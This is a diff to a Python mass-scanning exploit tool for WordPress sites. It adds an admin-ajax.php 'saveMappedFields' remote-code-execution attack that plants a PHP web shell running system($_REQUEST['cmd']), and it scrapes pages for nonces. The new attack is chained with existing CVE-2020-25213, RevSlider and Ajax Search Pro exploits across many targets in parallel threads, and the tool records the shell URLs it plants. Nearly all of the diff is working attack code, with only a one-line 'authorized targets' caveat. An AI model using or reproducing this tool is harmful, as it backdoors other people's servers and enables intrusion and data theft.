@@ -126,6 +126,7 @@ class WPFileManagerExploit:
             'Connection': 'keep-alive',
             'Upgrade-Insecure-Requests': '1',
         })
+        self.cookies = {}
 
     def _random_ip(self):
         return ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
@@ -229,6 +230,151 @@ class WPFileManagerExploit:
         except:
             pass
         return False, None
+    
+    def exploit_admin_ajax_rce(self, target_url, nonce=None, cookies=None):
+        """
+        Exploit for admin-ajax.php RCE via saveMappedFields action
+        Creates PHP file on target server
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing admin-ajax.php RCE exploit...")
+        
+        ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
+        shell_name = f"Nx_{random.randint(1000, 9999)}.php"
+        
+        # Payload that writes a PHP file
+        php_payload = f"<?php file_put_contents('{shell_name}','<?php $pass=\\\"aezeron\\\"; if(isset(\\$_REQUEST[\\'p\\']) && \\$_REQUEST[\\'p\\']==$pass){{ if(isset(\\$_REQUEST[\\'cmd\\'])){{ echo \\\"<pre>\\\"; system(\\$_REQUEST[\\'cmd\\']); echo \\\"</pre>\\\"; die; }} }} echo \\\"Shell Active\\\"; ?>'); ?>"
+        
+        # Alternative simpler payload
+        simple_payload = f"<?php file_put_contents('{shell_name}','<?php system(\\$_REQUEST[\\'cmd\\']); ?>'); ?>"
+        
+        # MappedFields JSON structure
+        mapped_fields = {
+            "pwn->cus2": php_payload
+        }
+        
+        data = {
+            'action': 'saveMappedFields',
+            'securekey': nonce if nonce else 'dummy_nonce',
+            'MappedFields': json.dumps(mapped_fields)
+        }
+        
+        # Set cookies if provided
+        if cookies:
+            self.session.cookies.update(cookies)
+        
+        headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': target_url
+        }
+        
+        try:
+            print(f"    {CYAN}[*]{RESET} Sending exploit payload to {ajax_url}")
+            
+            response = self.session.post(ajax_url, data=data, headers=headers, timeout=10)
+            
+            if response.status_code == 200:
+                print(f"    {GREEN}[+]{RESET} Request successful (Status: {response.status_code})")
+                
+                # Check if shell was created
+                shell_url = urljoin(target_url, shell_name)
+                print(f"    {CYAN}[*]{RESET} Checking for shell at: {shell_url}")
+                
+                time.sleep(2)  # Wait for file to be written
+                
+                if self.verify_shell(shell_url):
+                    print(f"    {GREEN}[SHELL]{RESET} Shell successfully created: {shell_url}?p={SHELL_PASSWORD}")
+                    return True, f"admin-ajax RCE Shell: {shell_url}?p={SHELL_PASSWORD}"
+                else:
+                    # Try alternative shell location
+                    alt_shell_url = urljoin(target_url, f'wp-content/{shell_name}')
+                    if self.verify_shell(alt_shell_url):
+                        print(f"    {GREEN}[SHELL]{RESET} Shell found in wp-content: {alt_shell_url}?p={SHELL_PASSWORD}")
+                        return True, f"admin-ajax RCE Shell: {alt_shell_url}?p={SHELL_PASSWORD}"
+                    
+                    print(f"    {YELLOW}[!]{RESET} Shell not found, but request was processed")
+                    print(f"    {YELLOW}[!]{RESET} Response preview: {response.text[:200]}")
+                    return False, "Shell created but verification failed"
+            else:
+                print(f"    {RED}[-]{RESET} Request failed (Status: {response.status_code})")
+                return False, f"Request failed with status {response.status_code}"
+                
+        except Exception as e:
+            print(f"    {RED}[-]{RESET} Error: {str(e)}")
+            return False, f"Error: {str(e)}"
+    
+    def brute_force_admin_ajax_nonce(self, target_url):
+        """
+        Attempt to brute force or find the nonce for admin-ajax.php
+        """
+        print(f"    {CYAN}[*]{RESET} Attempting to find valid nonce...")
+        
+        # Common nonce patterns
+        nonce_patterns = [
+            r'ajax_nonce["\']\s*:\s*["\']([^"\']+)',
+            r'_wpnonce["\']\s*:\s*["\']([^"\']+)',
+            r'nonce["\']\s*:\s*["\']([^"\']+)',
+            r'security["\']\s*:\s*["\']([^"\']+)',
+            r'ajaxnonce["\']\s*:\s*["\']([^"\']+)'
+        ]
+        
+        try:
+            # Check admin-ajax page for nonce
+            ajax_url = urljoin(target_url, 'wp-admin/admin-ajax.php')
+            response = self.session.get(ajax_url, timeout=5)
+            
+            # Look for nonce in response
+            for pattern in nonce_patterns:
+                match = re.search(pattern, response.text, re.IGNORECASE)
+                if match:
+                    nonce = match.group(1)
+                    print(f"    {GREEN}[+]{RESET} Found potential nonce: {nonce}")
+                    return nonce
+            
+            # Check admin page
+            admin_url = urljoin(target_url, 'wp-admin/admin.php')
+            response = self.session.get(admin_url, timeout=5)
+            for pattern in nonce_patterns:
+                match = re.search(pattern, response.text, re.IGNORECASE)
+                if match:
+                    nonce = match.group(1)
+                    print(f"    {GREEN}[+]{RESET} Found nonce in admin page: {nonce}")
+                    return nonce
+            
+            print(f"    {YELLOW}[!]{RESET} Could not find nonce, will try without it")
+            return None
+            
+        except Exception as e:
+            print(f"    {YELLOW}[!]{RESET} Error finding nonce: {str(e)}")
+            return None
+    
+    def exploit_admin_ajax_auto(self, target_url):
+        """
+        Auto exploit admin-ajax.php - tries to find nonce and execute
+        """
+        print(f"\n  {CYAN}[*]{RESET} Testing admin-ajax.php auto-exploit...")
+        
+        # Try to get cookies first (visit site)
+        try:
+            self.session.get(target_url, timeout=5)
+            print(f"    {GREEN}[+]{RESET} Session established")
+        except:
+            pass
+        
+        # Try to find nonce
+        nonce = self.brute_force_admin_ajax_nonce(target_url)
+        
+        # Try exploit with found nonce
+        success, msg = self.exploit_admin_ajax_rce(target_url, nonce)
+        
+        if success:
+            return success, msg
+        
+        # Try without nonce (some plugins don't check)
+        print(f"    {CYAN}[*]{RESET} Trying without nonce...")
+        success, msg = self.exploit_admin_ajax_rce(target_url, None)
+        
+        return success, msg
     
     def check_version_cve_2020_25213(self, target_url):
         """Check wp-file-manager version for CVE-2020-25213"""
@@ -635,6 +781,7 @@ class WPFileManagerExploit:
             'revslider': False,
             'brute_upload': False,
             'cve_2020_25213': False,
+            'admin_ajax_rce': False,
             'shell_urls': [],
             'details': []
         }
@@ -645,6 +792,16 @@ class WPFileManagerExploit:
             results['details'].append(f"Writable directories: {', '.join(writable_dirs)}")
         if found_shells:
             results['shell_urls'].extend(found_shells)
+        
+        # Test admin-ajax.php RCE
+        print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
+        ajax_result, ajax_msg = self.exploit_admin_ajax_auto(target_url)
+        results['admin_ajax_rce'] = ajax_result
+        results['details'].append(f"[AdminAjaxRCE] {ajax_msg}")
+        if ajax_result and "Shell" in ajax_msg:
+            shell_part = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
+            if shell_part not in results['shell_urls']:
+                results['shell_urls'].append(shell_part)
         
         # Test CVE-2020-25213 specifically
         print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213 (WP File Manager RCE)...")
@@ -666,11 +823,11 @@ class WPFileManagerExploit:
                 results['shell_urls'].append(shell_part)
         
         print(f"{CYAN}[*]{RESET} Testing Ajax Search Pro exploit...")
-        ajax_result, ajax_msg = self.exploit_ajax_search_pro(target_url)
-        results['ajax_search'] = ajax_result
-        results['details'].append(f"[AjaxSearch] {ajax_msg}")
-        if ajax_result:
-            shell_part = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
+        ajax_result2, ajax_msg2 = self.exploit_ajax_search_pro(target_url)
+        results['ajax_search'] = ajax_result2
+        results['details'].append(f"[AjaxSearch] {ajax_msg2}")
+        if ajax_result2:
+            shell_part = ajax_msg2.split(': ')[1] if ': ' in ajax_msg2 else ajax_msg2
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
@@ -692,7 +849,7 @@ class WPFileManagerExploit:
             if shell_part not in results['shell_urls']:
                 results['shell_urls'].append(shell_part)
         
-        if not any([fm_result, ajax_result, rev_result, brute_result, cve_result]):
+        if not any([fm_result, ajax_result2, rev_result, brute_result, cve_result, ajax_result]):
             results['details'].append("All exploit attempts failed")
         
         return results
@@ -810,8 +967,17 @@ def scan_single_target(target_url, exploit=False):
         if exploit:
             exploiter = WPFileManagerExploit()
             
-            # Try CVE-2020-25213 first
-            print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213 (most reliable)...")
+            # Try admin-ajax.php RCE first
+            print(f"{CYAN}[*]{RESET} Testing admin-ajax.php RCE...")
+            ajax_success, ajax_msg = exploiter.exploit_admin_ajax_auto(target_url)
+            if ajax_success and "Shell" in ajax_msg:
+                shell_url = ajax_msg.split(': ')[1] if ': ' in ajax_msg else ajax_msg
+                if shell_url not in result['shell_urls']:
+                    result['shell_urls'].append(shell_url)
+                print(f"  {GREEN}[SHELL]{RESET} {ajax_msg}")
+            
+            # Try CVE-2020-25213
+            print(f"{CYAN}[*]{RESET} Testing CVE-2020-25213...")
             cve_success, cve_msg = exploiter.exploit_cve_2020_25213(target_url, auto_shell=True)
             if cve_success and "Shell" in cve_msg:
                 shell_url = cve_msg.split(': ')[1] if ': ' in cve_msg else cve_msg
@@ -859,7 +1025,7 @@ def mass_scan_targets(targets, max_workers=30, exploit=False):
     
     print(f"\n{BLUE}[*]{RESET} Starting WP Exploit Scanner for {CYAN}{total}{RESET} targets")
     if exploit:
-        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED (Including CVE-2020-25213)")
+        print(f"{RED}[!]{RESET} AUTO EXPLOIT MODE ENABLED (CVE-2020-25213 + Admin Ajax RCE)")
     
     with ThreadPoolExecutor(max_workers=max_workers) as executor:
         future_to_target = {executor.submit(scan_single_target, target, exploit): target for target in targets}
@@ -940,7 +1106,7 @@ def save_results(results, filename="wp_exploit_results.txt"):
     try:
         with open(filename, 'w', encoding='utf-8') as f:
             f.write("=" * 100 + "\n")
-            f.write("WORDPRESS EXPLOIT SCANNER RESULTS (Including CVE-2020-25213)\n")
+            f.write("WORDPRESS EXPLOIT SCANNER RESULTS (CVE-2020-25213 + Admin Ajax RCE)\n")
             f.write("=" * 100 + "\n\n")
             
             wp_count = len([r for r in results if r['is_wordpress']])
@@ -993,7 +1159,7 @@ def main():
 ╚███╔███╔╝██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
  ╚══╝╚══╝ ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                             
-                   FILE MANAGER EXPLOIT SCANNER + CVE-2020-25213
+           FILE MANAGER EXPLOIT + ADMIN-AJAX RCE + CVE-2020-25213
 {RESET}
 """
     
@@ -1023,7 +1189,7 @@ def main():
     
     print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
     if exploit:
-        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED (CVE-2020-25213 + others)")
+        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED (Admin Ajax RCE + CVE-2020-25213)")
         print(f"{YELLOW}[!]{RESET} Use only on authorized targets")
     print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop")
     
